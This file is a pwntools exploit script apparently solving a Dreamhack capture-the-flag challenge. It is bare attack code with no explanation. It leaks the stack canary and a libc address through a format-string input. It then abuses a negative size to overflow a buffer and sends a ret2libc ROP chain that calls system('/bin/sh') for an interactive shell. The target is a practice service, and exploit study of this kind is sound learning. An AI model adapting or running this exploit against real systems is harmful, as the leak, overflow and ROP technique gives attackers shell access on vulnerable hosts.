from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20284
r = remote(HOST, PORT)

def intro(data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', data)

def say_hi():
    r.sendlineafter(b'> ', b'2')

def present(size, data):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', str(size).encode()) # max 64
    r.sendafter(b'> ', data)

intro(b'%7$p %13$p')
say_hi()

r.recvuntil(b', ')
canary, libc = r.recvuntil(b'!').strip(b'!\n').strip().decode().split()
canary = int(canary, 16)
libc = int(libc,16) - 0x2a1ca

binsh = libc + 0x1cb42f
pop_rdi = libc + 0x10f78b
pop_rsi = libc + 0x110a7d
ret = libc + 0x2882f
system = libc + 0x58750
payload = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(system)

present(-1, b'A'*72 + p64(canary) + b'A'*8 + p64(ret) + payload)


r.interactive()